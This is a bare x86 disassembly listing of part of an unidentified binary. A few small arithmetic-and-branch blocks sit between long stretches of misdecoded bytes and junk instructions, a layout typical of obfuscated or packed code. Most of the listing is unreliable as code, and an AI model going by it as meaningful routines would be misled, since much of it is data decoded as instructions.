  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403ab6
  403acb:	ror    BYTE PTR [edx],cl
  403acd:	(bad)  
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403a5b
  403ad7:	mov    dl,0x4e
  403ad9:	scas   eax,DWORD PTR es:[edi]
  403ada:	aad    0x69
  403adc:	xchg   ebx,eax
  403add:	scas   al,BYTE PTR es:[edi]
  403ade:	jecxz  0x403b57
  403ae0:	loope  0x403b0a
  403ae2:	jp     0x403ab6
  403ae4:	cli    
  403ae5:	add    al,0x9b
  403ae7:	nop
  403ae8:	dec    eax
  403ae9:	sub    DWORD PTR [esi-0x6d],ebp
  403aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aed:	int3   
  403aee:	cmp    dl,bh
  403af0:	sbb    eax,0x24
  403af3:	imul   ebp,edx,0x66c11daa
  403af9:	sbb    DWORD PTR [esi],ebx
  403afb:	inc    eax
  403afc:	aaa    
  403afd:	jle    0x403b4c
  403aff:	addr16 sti 
  403b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b02:	cmp    BYTE PTR [edi-0x21],ah
  403b05:	cmp    esi,eax
  403b07:	mov    ebx,0x2d7fe15b
  403b0c:	inc    edi
  403b0d:	icebp  
  403b0e:	or     al,0xd0
  403b10:	xor    bl,BYTE PTR [edx]
  403b12:	cs jbe 0x403ae9
  403b15:	jo     0x403b67
  403b17:	mov    ebp,0x80aaf352
  403b1c:	adc    al,BYTE PTR [ecx-0x51]
  403b1f:	adc    BYTE PTR [ebx],dh
  403b21:	ss pop eax
  403b23:	inc    esi
  403b24:	mov    al,0xa4
  403b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b27:	xchg   ebp,eax
  403b28:	or     al,BYTE PTR [ebx+0x16536505]
  403b2e:	mov    gs,WORD PTR [eax]
  403b30:	addr16 mov ecx,0x57321754
  403b36:	and    BYTE PTR [edx],ch
  403b38:	shl    ch,1
  403b3a:	imul   ecx,DWORD PTR [ebp+0x4903777c],0xffffff8e
  403b41:	lock mov cl,0xbc
  403b44:	pop    esp
  403b45:	leave  
  403b46:	aaa    
  403b47:	pop    di
  403b49:	push   ecx
  403b4a:	ja     0x403ae9
  403b4c:	mov    al,0xf1
  403b4e:	xchg   ebx,eax
  403b4f:	inc    edi
  403b50:	xchg   ebx,eax
  403b51:	arpl   WORD PTR [eax],ax
  403b53:	jo     0x403b51
  403b55:	xchg   edx,eax
  403b56:	cmp    dl,BYTE PTR [ebp-0x3fa12e6b]
  403b5c:	aad    0x5c
  403b5e:	xor    ah,cl
  403b60:	push   edi
  403b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b62:	je     0x403b65
  403b64:	inc    ebx
  403b65:	(bad)  
  403b66:	lods   eax,DWORD PTR ds:[esi]
  403b67:	not    DWORD PTR [edx]
  403b69:	aam    0x54
  403b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b6c:	ficom  DWORD PTR [ecx+0x3c]
  403b6f:	(bad)  
  403b70:	retf   
  403b71:	test   DWORD PTR [ebp-0x7c74abd0],0xdc4548d4
  403b7b:	pop    esp
  403b7c:	repz frstor [eax+ebx*8-0x6f692456]
  403b84:	mov    ecx,0x562beef8
  403b89:	in     al,dx
  403b8a:	push   ebx
  403b8b:	jp     0x403b50
  403b8d:	or     BYTE PTR [ecx+0x10],ch
  403b90:	cwde   
  403b91:	push   0xe067bac4
  403b96:	cs jecxz 0x403b6d
  403b99:	sub    BYTE PTR [esi+0x28451eb0],0x6b
  403ba0:	loopne 0x403ba9
  403ba2:	arpl   WORD PTR [eax],bp
  403ba4:	ins    BYTE PTR es:[edi],dx
  403ba5:	mov    gs,WORD PTR [ebx+0x6e]
  403ba8:	lahf   
  403ba9:	test   edi,edi
  403bab:	das    
  403bac:	sar    BYTE PTR [ebx],1
  403bae:	lds    esp,FWORD PTR [eax-0x58746bdf]
  403bb4:	pushf  
  403bb5:	repnz cmp ecx,DWORD PTR ds:0x80106aa5
  403bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bbd:	adc    al,0x32
  403bbf:	xor    dh,bl
  403bc1:	pop    ebx
  403bc2:	xlat   BYTE PTR ds:[ebx]
  403bc3:	rol    DWORD PTR [esi+0x49ed4cb5],cl
  403bc9:	rcr    BYTE PTR [edx],0xca
  403bcc:	pop    ecx
  403bcd:	push   edi
  403bce:	stos   BYTE PTR es:[edi],al
  403bcf:	mov    ds:0xc482d3e2,eax
  403bd4:	repnz loop 0x403bc0
  403bd7:	cmp    eax,0xb9cf8e1b
  403bdc:	(bad)  
  403bdd:	out    0x3b,al
  403bdf:	xchg   ebp,eax
  403be0:	popf   
  403be1:	pusha  
  403be2:	xor    DWORD PTR [edi-0x4d],ebp
  403be5:	inc    ebp
  403be6:	loopne 0x403bbd
  403be8:	leave  
  403be9:	inc    edi
  403bea:	test   al,0xe1
  403bec:	mov    esp,0x4674ab82
  403bf1:	out    dx,al
  403bf2:	or     BYTE PTR [edi-0x54],al
  403bf5:	rcr    DWORD PTR [edx+0x6d],cl
  403bf8:	cdq    
  403bf9:	dec    ebp
  403bfa:	mov    BYTE PTR [eax+0x72755a52],bh
  403c00:	pushf  
  403c01:	loopne 0x403c4e
  403c03:	sbb    edx,DWORD PTR [edi+0x15]
  403c06:	shr    DWORD PTR [edi+0x66a56157],0xe7
  403c0d:	mov    ds:0x6bcc869d,eax
  403c12:	push   0xc6a8d070
  403c17:	and    DWORD PTR [edi+ebx*8],0x46
  403c1b:	in     eax,0xf1
  403c1d:	adc    eax,0xd60812a7
  403c22:	lods   eax,DWORD PTR ds:[esi]
  403c23:	test   DWORD PTR [esi-0x107a8b7b],ecx
  403c29:	loope  0x403be8
  403c2b:	mov    ecx,0xad62aa00
  403c30:	push   edx
  403c31:	jae    0x403bd3
  403c33:	comiss xmm3,DWORD PTR [esp+edi*4+0x3b]
  403c38:	aaa    
  403c39:	or     ecx,DWORD PTR [esi+0x34]
  403c3c:	int3   
  403c3d:	loope  0x403c46
  403c3f:	push   esp
  403c40:	enter  0x2c3,0xd2
  403c44:	sub    bl,ah
  403c46:	clc    
  403c47:	scas   al,BYTE PTR es:[edi]
  403c48:	push   ecx
  403c49:	test   BYTE PTR [ecx+0x4c],cl
  403c4c:	(bad)  
  403c4d:	mov    ebx,0xdf0094f3
  403c52:	mov    ecx,0x5664fdbf
  403c57:	jnp    0x403c74
  403c59:	mov    cl,0xfe
  403c5b:	shl    BYTE PTR [ecx-0x6c],cl
  403c5e:	pop    ss
  403c5f:	jmp    0x4c80:0xe91199cc
  403c66:	mov    cl,0x89
  403c68:	jp     0x403c7c
  403c6a:	ficom  WORD PTR [eax-0x6]
  403c6d:	and    DWORD PTR [ebx+ebx*4],ebx
  403c70:	sub    eax,0x638794d0
  403c75:	fwait
  403c76:	in     eax,dx
  403c77:	xchg   esp,eax
  403c78:	mov    cl,0x96
  403c7a:	lods   al,BYTE PTR ds:[esi]
  403c7b:	shl    BYTE PTR [ebx],1
  403c7d:	pop    ds
  403c7e:	imul   edi,DWORD PTR [ebx],0x8992e910
  403c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c85:	bound  edx,QWORD PTR [edx-0x43]
  403c88:	ds add eax,0xc95516d6
  403c8e:	inc    esi
  403c8f:	mov    ecx,DWORD PTR [ebp-0xe9a275d]
  403c95:	(bad)  
  403c96:	push   cs
  403c97:	mov    al,0xa6
  403c99:	and    bh,BYTE PTR [esi-0x5c55cc8]
  403c9f:	fsub   QWORD PTR [esi-0x56be6def]
  403ca5:	lods   eax,DWORD PTR ds:[esi]
  403ca6:	cmp    al,0xec
  403ca8:	loop   0x403c80
  403caa:	imul   edi,DWORD PTR [esp+ecx*1],0x1fb8c4b5
  403cb1:	jo     0x403c36
  403cb3:	push   edx
  403cb4:	lahf   
  403cb5:	or     DWORD PTR [eax-0x50e4a58e],ebp
  403cbb:	add    al,0x36
  403cbd:	push   edi
  403cbe:	pop    es
  403cbf:	retf   
  403cc0:	mov    edx,0x5f4ac301
  403cc5:	add    dh,dh
  403cc7:	mov    ah,BYTE PTR [edi]
  403cc9:	or     esp,DWORD PTR [ecx+0x2c14009f]
  403ccf:	cwde   
  403cd0:	xor    al,cl
  403cd2:	jmp    0xe591:0x4ba36117
  403cd9:	xchg   edx,eax
  403cda:	les    ebx,FWORD PTR [ecx+0x75]
  403cdd:	inc    ebp
  403cde:	lds    edx,FWORD PTR [edi+0x15]
  403ce1:	ret    
  403ce2:	or     DWORD PTR [ecx],ebx
  403ce4:	and    eax,0x7b33ee0d
  403ce9:	iret   
  403cea:	pop    esp
  403ceb:	out    dx,eax
  403cec:	(bad)  
  403ced:	out    0xdb,eax
  403cef:	jmp    0x403ca8
  403cf1:	and    ch,BYTE PTR [edi-0x80]
  403cf4:	aam    0x72
  403cf6:	or     esp,DWORD PTR [esi]
  403cf8:	imul   esp,DWORD PTR [ebx-0x28417e3a],0xf385ad32
  403d02:	or     esi,eax
  403d04:	leave  
  403d05:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  403d07:	xor    ecx,ecx
  403d09:	setne  bl
  403d0c:	(bad)  
  403d0d:	cmp    al,0x5
  403d0f:	push   ebp
  403d10:	sbb    DWORD PTR [ebx+eax*2-0x6d],ebx
  403d14:	inc    ebp
  403d15:	ret    0x9789
  403d18:	repnz test BYTE PTR [edi-0x33],ah
  403d1c:	fsubr  DWORD PTR [ecx-0x76]
  403d1f:	xor    esp,DWORD PTR [edi+0x6193f116]
  403d25:	and    al,0x56
  403d27:	imul   ebx,DWORD PTR [eax+0x43ccafc2],0xce2ee828
  403d31:	lds    ebp,FWORD PTR [eax-0x49]
  403d34:	dec    edx
  403d35:	dec    edx
  403d36:	mov    cl,0x28
  403d38:	cwde   
  403d39:	add    esp,DWORD PTR [ecx]
  403d3b:	mov    dh,0xd8
  403d3d:	jg     0x403d63
  403d3f:	mov    ?,WORD PTR [esi-0x1c]
  403d42:	mov    dl,0x51
  403d44:	mov    dl,BYTE PTR [ebp-0x6a03c410]
  403d4a:	test   al,0xd7
  403d4c:	int    0x43
  403d4e:	push   ebx
  403d4f:	call   DWORD PTR [esi-0x39]
  403d52:	dec    esp
  403d53:	jmp    0x403d82
  403d55:	mov    eax,0x7cb75d13
  403d5a:	mov    ebx,0xca6e7b
  403d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d60:	sub    DWORD PTR [edx-0x41],eax
  403d63:	adc    ecx,DWORD PTR [edi-0x41558ce5]
  403d69:	in     eax,dx
  403d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d6b:	adc    eax,0x7e125a04
  403d70:	(bad)  
  403d71:	push   0x99e54360
  403d76:	jno    0x403d44
  403d78:	mov    ah,0x14
  403d7a:	pop    ss
  403d7b:	mov    esi,0x43e96203
  403d80:	call   0x44b5:0xe61d79f7
  403d87:	in     eax,0x96
  403d89:	out    dx,al
  403d8a:	mov    eax,ds:0x6253cdf2
  403d8f:	push   0x7d79e13b
  403d94:	sti    
  403d95:	sar    DWORD PTR [edi-0xfc7ac30],cl
  403d9b:	shr    BYTE PTR [edx],0x83
  403d9e:	pop    ebx
  403d9f:	lahf   
  403da0:	inc    edi
  403da1:	popf   
  403da2:	pop    esp
  403da3:	std    
  403da4:	jno    0x403d6e
  403da6:	mov    cs,si
  403da9:	and    BYTE PTR [edi],cl
  403dab:	out    0x96,eax
  403dad:	in     eax,0xf
  403daf:	cmp    DWORD PTR [esi+0x23],edi
  403db2:	jg     0x403e1e
  403db4:	mov    dl,0xf1
  403db6:	mul    DWORD PTR [ebp-0x61271ebf]
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xfffffff2
  403e75:	jecxz  0x403e0e
  403e77:	jns    0x403e83
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e5b
  403e81:	jo     0x403ebe
  403e83:	lds    ebx,FWORD PTR [edx-0x13329f86]
  403e89:	imul   edi,edx,0xfffffff3
  403e8c:	push   ds
  403e8d:	dec    edi
  403e8e:	xor    DWORD PTR [edx-0x52f33179],0x12a4e4ec
  403e98:	clc    
  403e99:	xor    eax,0x1fbbdb70
  403e9e:	test   al,0xd8
  403ea0:	dec    ecx
  403ea1:	cmp    eax,0xce5d3a34
  403ea6:	pop    ds
  403ea7:	jb     0x403f0c
  403ea9:	or     eax,DWORD PTR [esi+0x6b1ec610]
  403eaf:	fs adc al,0x97
  403eb2:	out    0x79,eax
  403eb4:	clc    
  403eb5:	dec    esp
  403eb6:	and    eax,ecx
  403eb8:	push   0x59f51c3d
  403ebd:	ins    DWORD PTR es:[edi],dx
  403ebe:	jmp    0x403edf
  403ec0:	arpl   WORD PTR [edi],bx
  403ec2:	shl    DWORD PTR [edi],0x6d
  403ec5:	ds stos BYTE PTR es:[edi],al
  403ec7:	icebp  
  403ec8:	jge    0x403f0e
  403eca:	je     0x403f1e
  403ecc:	lods   eax,DWORD PTR ds:[esi]
  403ecd:	jno    0x403ec3
  403ecf:	xor    al,BYTE PTR [esi-0x22]
  403ed2:	push   edi
  403ed3:	xchg   ecx,eax
  403ed4:	leave  
  403ed5:	and    ah,cl
  403ed7:	and    dl,BYTE PTR [ebx]
  403ed9:	xor    al,0x3a
  403edb:	mov    edi,0xd3da5d7b
  403ee0:	pop    DWORD PTR [ebx+0x20]
  403ee3:	sbb    ebx,DWORD PTR ds:0x1a306fa3
  403ee9:	int    0xaf
  403eeb:	(bad)  
  403eec:	cli    
  403eed:	or     cl,BYTE PTR [esi+0x75]
  403ef0:	test   BYTE PTR [ebx],bl
  403ef2:	mov    al,ds:0x9cb0822d
  403ef7:	lea    ebx,[esi+ecx*2+0x16]
  403efb:	add    eax,0x1d06b88c
  403f00:	mov    edx,0xfa761703
  403f05:	pop    esi
  403f06:	jb     0x403ef4
  403f08:	mov    ch,0x72
  403f0a:	call   0x561f:0x370e057a
  403f11:	jg     0x403ea5
  403f13:	and    al,0xf4
  403f15:	mov    dh,0x35
  403f17:	(bad)  [ebp-0x6b]
  403f1a:	sbb    eax,0xc3bac70e
  403f1f:	jno    0x403f2c
  403f21:	pop    ss
  403f22:	(bad)  
  403f23:	fistp  DWORD PTR ds:0xc423102a
  403f29:	mov    eax,0x9781c99
  403f2e:	cmp    bl,BYTE PTR [ebp+0x6cfd3a6b]
  403f34:	ror    dh,0x29
  403f37:	sbb    DWORD PTR [edx],0xffffffa0
  403f3a:	xchg   esi,eax
  403f3b:	out    dx,al
  403f3c:	stos   DWORD PTR es:[edi],eax
  403f3d:	test   dh,ah
  403f3f:	lock dec esi
  403f41:	push   edi
  403f42:	test   eax,0x1075849f
  403f47:	mov    ebp,0xd26b3732
  403f4c:	adc    bh,BYTE PTR [ecx+0x4ca0c5b8]
  403f52:	ds jmp 0x6e2c:0xb33689eb
  403f5a:	xor    BYTE PTR [ecx],ah
  403f5c:	pavgw  mm4,QWORD PTR [ebx-0x3d38aa2f]
  403f63:	sbb    eax,0xf0b972e4
  403f68:	rol    BYTE PTR [edx+0x14],cl
  403f6b:	sti    
  403f6c:	in     eax,dx
  403f6d:	icebp  
  403f6e:	lock mov ch,BYTE PTR [esi-0x61822895]
  403f75:	popf   
  403f76:	imul   esp,DWORD PTR ds:0x2c7fc2c0,0xae0405ce
  403f80:	mov    DWORD PTR [ebx+ebx*4-0x5e],ebx
  403f84:	dec    eax
  403f85:	es inc ecx
  403f87:	sub    bl,BYTE PTR [edi+0x16ef5a07]
  403f8d:	cld    
  403f8e:	and    eax,0x955dfd53
  403f93:	pop    ebp
  403f94:	stos   DWORD PTR es:[edi],eax
  403f95:	rol    DWORD PTR [ecx-0x5e131950],cl
  403f9b:	mov    dh,0xfa
  403f9d:	cdq    
  403f9e:	xor    al,al
  403fa0:	shl    DWORD PTR fs:[ebx+0x48],1
  403fa4:	sbb    al,0x96
  403fa6:	lds    esp,FWORD PTR [ecx+0x5b8b76b8]
  403fac:	jae    0x403fe9
  403fae:	jmp    0x9546:0xf7398b08
  403fb5:	dec    esi
  403fb6:	jns    0x404002
  403fb8:	cld    
  403fb9:	test   BYTE PTR [ecx+0x29ef33b7],al
  403fbf:	hlt    
  403fc0:	hlt    
  403fc1:	out    0xd3,al
  403fc3:	pop    ss
  403fc4:	dec    eax
  403fc5:	rcl    BYTE PTR [ecx],1
  403fc7:	mov    edx,0x50faf437
  403fcc:	shr    al,0x8a
  403fcf:	or     al,0x50
  403fd1:	dec    esp
  403fd2:	ror    DWORD PTR [ebp-0x2dc272df],0xf4
  403fd9:	jb     0x404058
  403fdb:	imul   eax,DWORD PTR [ecx],0xffffffb8
  403fde:	gs jmp 0x403fcb
  403fe1:	xchg   esi,eax
  403fe2:	in     al,dx
  403fe3:	jo     0x40405a
  403fe5:	push   ds
  403fe6:	mov    eax,0x9376303b
  403feb:	sub    ecx,DWORD PTR [edi-0x443bbb82]
  403ff1:	(bad)  
  403ff2:	cmp    bl,BYTE PTR [ebx+0x49]
  403ff5:	das    
  403ff6:	or     cl,BYTE PTR [ebx+0x1ecb7d07]
  403ffc:	add    DWORD PTR [edi+0x76],0xadf3c807
  404003:	out    0xbb,eax
  404005:	es jge 0x40406d
  404008:	retf   0x160
  40400b:	cmp    DWORD PTR [ecx+0x68],0x34c765d7
  404012:	sub    al,0x3
  404014:	lods   eax,DWORD PTR ds:[esi]
  404015:	push   esi
  404016:	mov    esp,0x4c67d830
  40401b:	push   esi
  40401c:	cs clc 
  40401e:	sbb    edx,DWORD PTR [ecx+0x31]
  404021:	pop    ebx
  404022:	sub    BYTE PTR [edx+0xf],dl
  404025:	cld    
  404026:	cmp    DWORD PTR [ebx-0x65d8a639],ebp
  40402c:	arpl   WORD PTR [ebx-0x24387174],cx
  404032:	ret    0x6473
  404035:	jne    0x40400e
  404037:	lods   eax,DWORD PTR ds:[esi]
  404038:	inc    esp
  404039:	dec    ebp
  40403a:	aad    0x9e
  40403c:	jne    0x403ff2
  40403e:	adc    eax,edx
  404040:	dec    esp
  404041:	push   es
  404042:	mov    eax,0xa5ab78bf
  404047:	push   ss
  404048:	addr16 xchg esi,eax
  40404a:	cmp    eax,0x346feaa8
  40404f:	stc    
  404050:	dec    esi
  404051:	(bad)  
  404052:	mov    ecx,0xe2f938ef
  404057:	mov    fs,edx
  404059:	loop   0x4040b4
  40405b:	or     DWORD PTR [edi-0x54d92401],ebx
  404061:	sub    al,0x85
  404063:	lods   al,BYTE PTR ds:[esi]
  404064:	xchg   edi,eax
  404065:	lock (bad) 
  404068:	add    eax,DWORD PTR [eax+ebx*4-0xb]
  40406c:	add    eax,0x6f9cca52
  404071:	jecxz  0x404025
  404073:	dec    edx
  404074:	xchg   ebx,eax
  404075:	pop    ss
  404076:	imul   eax,edi,0x9
  404079:	jns    0x404081
  40407b:	das    
  40407c:	and    dh,bl
  40407e:	stos   DWORD PTR es:[edi],eax
  40407f:	pop    esi
  404080:	mov    ds:0x3625135d,al
  404085:	mov    cs,WORD PTR [ecx+0x74a74663]
  40408b:	loop   0x4040cd
  40408d:	sbb    BYTE PTR [edx+0x23bd5e4d],bh
  404093:	retf   0xc5d3
  404096:	shl    DWORD PTR [ebx+eiz*1-0x1f69ae20],cl
  40409d:	fstp   QWORD PTR [ecx+0x7ccce6c5]
  4040a3:	cmp    al,0x36
  4040a5:	stos   DWORD PTR es:[edi],eax
  4040a6:	mov    esi,0x2fe14cf0
  4040ab:	ds (bad) 
  4040ae:	stos   DWORD PTR es:[edi],eax
  4040af:	mov    esp,cs
  4040b1:	retf   
  4040b2:	mov    bh,0x7a
  4040b4:	and    al,0x69
  4040b6:	fs xor al,0xe1
  4040b9:	es push eax
  4040bb:	test   DWORD PTR [edi-0x30],ecx
  4040be:	adc    BYTE PTR [ebx],cl
  4040c0:	lods   al,BYTE PTR ds:[esi]
  4040c1:	sbb    bh,BYTE PTR [edi-0x10]
  4040c4:	ja     0x40408a
  4040c6:	adc    eax,edi
  4040c8:	mov    DWORD PTR [ebx+0x76],edi
  4040cb:	dec    esp
  4040cc:	push   0x7c
  4040ce:	fsub   DWORD PTR [eax-0x7e]
  4040d1:	(bad)  
  4040d3:	xor    ecx,0x4d6cf51
  4040d9:	retf   0x1537
  4040dc:	jle    0x404151
  4040de:	(bad)  
  4040df:	dec    esi
  4040e0:	out    dx,al
  4040e1:	jmp    0x9436e386
  4040e6:	and    al,0x20
  4040e8:	shl    BYTE PTR ds:0xc9cbba0f,1
  4040ee:	fsub   DWORD PTR [edi-0x74]
  4040f1:	mov    ecx,0x88b345ef
  4040f6:	push   es
  4040f7:	icebp  
  4040f8:	inc    edx
  4040f9:	xor    DWORD PTR [edx+eax*4+0x52],edx
  4040fd:	jmp    0xc9357264
  404102:	mov    BYTE PTR [edi],0x14
  404105:	mov    edi,0xfd0f4a87
  40410a:	ins    BYTE PTR es:[edi],dx
  40410b:	adc    edi,DWORD PTR ds:0xbf2cca6a
  404111:	add    BYTE PTR [ebx+0x58],bl
  404114:	int3   
  404115:	mov    dh,0xfe
  404117:	push   cs
  404118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404119:	push   es
  40411a:	je     0x40413c
  40411c:	adc    eax,0x3ccbb025
  404121:	or     ecx,esi
  404123:	shl    DWORD PTR [edi],cl
  404125:	push   ecx
  404126:	jmp    0x414e:0x295cb3f8
  40412d:	pop    ss
  40412e:	lods   eax,DWORD PTR ds:[esi]
  40412f:	sub    al,BYTE PTR [eax-0x29]
  404132:	push   es
  404133:	add    eax,0x485b8021
  404138:	pusha  
  404139:	repz and bl,BYTE PTR cs:[ebx-0x7a]
  40413e:	pushf  
  40413f:	(bad)  
  404140:	je     0x40419f
  404142:	cmp    DWORD PTR [edx-0x7d],edx
  404145:	es fs mov bl,0x21
  404149:	xor    BYTE PTR [edx],al
  40414b:	(bad)  
  40414d:	or     dh,ch
  40414f:	xor    al,0xf7
  404151:	cdq    
  404152:	shr    DWORD PTR [ecx+eiz*4],cl
  404155:	lahf   
  404156:	icebp  
  404157:	cld    
  404158:	sub    ebp,DWORD PTR [ebx-0x6a]
  40415b:	mov    dl,0xca
  40415d:	mov    al,0xd9
  40415f:	push   0x3ef631d0
  404164:	fs mov dl,0x2b
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [esp+eiz*4+0x1d74fd24],dl
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x40416c
  404197:	popf   
  404198:	rcl    DWORD PTR [eax],0x75
  40419b:	mov    bl,0xb1
  40419d:	nop
  40419e:	mov    al,ds:0xfe0f1377
  4041a3:	out    0x9,al
  4041a5:	fcom   DWORD PTR [esi+0x7e]
  4041a8:	xor    DWORD PTR [edi+0x32],0xa0819679
  4041af:	xor    al,0xd7
  4041b1:	mov    ds:0x33590c2f,al
  4041b6:	(bad)  
  4041b7:	imul   ecx,ecx,0x75
  4041ba:	fcomi  st,st(2)
  4041bc:	ds loopne 0x404159
  4041bf:	lods   al,BYTE PTR ds:[esi]
  4041c0:	jmp    0x40421b
  4041c2:	pop    ds
  4041c3:	imul   ecx,DWORD PTR [esi+0x2202ca3f],0x26
  4041ca:	cmp    DWORD PTR [ebp+0x13],edx
  4041cd:	dec    ebx
  4041ce:	push   edx
  4041cf:	fist   WORD PTR [ecx-0x4f3778c1]
  4041d5:	ja     0x404188
  4041d7:	xor    BYTE PTR [edi+0x66],cl
  4041da:	jg     0x4041b7
  4041dc:	push   cs
  4041dd:	dec    ebx
  4041de:	clc    
  4041df:	clc    
  4041e0:	stos   DWORD PTR es:[edi],eax
  4041e1:	adc    dh,dh
  4041e3:	rol    DWORD PTR [ebp+0x2],cl
  4041e6:	inc    edx
  4041e7:	je     0x40418a
  4041e9:	cdq    
  4041ea:	xor    bl,dh
  4041ec:	(bad)  
  4041ed:	jle    0x404211
  4041ef:	jo     0x4041ea
  4041f1:	cli    
  4041f2:	push   ebp
  4041f3:	xor    al,0x83
  4041f5:	pop    es
  4041f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f7:	mov    esi,0xd930fb4e
  4041fc:	cmp    BYTE PTR [ebx],dh
  4041fe:	push   edx
  4041ff:	mov    edx,gs
  404201:	sbb    edi,ebx
  404203:	inc    ecx
  404204:	pop    ebp
  404205:	lods   eax,DWORD PTR ds:[esi]
  404206:	loope  0x4041ae
  404208:	xchg   esp,eax
  404209:	cmp    BYTE PTR [ebx-0x1f55512b],ch
  40420f:	pop    ebx
  404210:	xchg   ecx,eax
  404211:	mov    eax,0x427e9912
  404216:	out    dx,eax
  404217:	fdiv   st,st(2)
  404219:	fcmovu st,st(6)
  40421b:	test   DWORD PTR cs:[esp+ecx*8+0x70],0x2239b69e
  404224:	or     bh,BYTE PTR [edi-0x15a517b1]
  40422a:	adc    eax,0x3c00e5bb
  40422f:	cmp    eax,0x46491ce5
  404234:	xchg   ebp,eax
  404235:	sti    
  404236:	cwde   
  404237:	in     al,dx
  404238:	xchg   DWORD PTR [ecx+0x4464d849],eax
  40423e:	jmp    0x2c074f1b
  404243:	(bad)  
  404244:	cdq    
  404245:	iret   
  404246:	iret   
  404247:	sbb    al,0xeb
  404249:	sahf   
  40424a:	test   BYTE PTR [ecx],dl
  40424c:	nop
  40424d:	rcr    ebp,cl
  40424f:	sbb    bh,BYTE PTR [ebx-0x2c983373]
  404255:	push   esi
  404256:	mov    dl,0xde
  404258:	jne    0x40420b
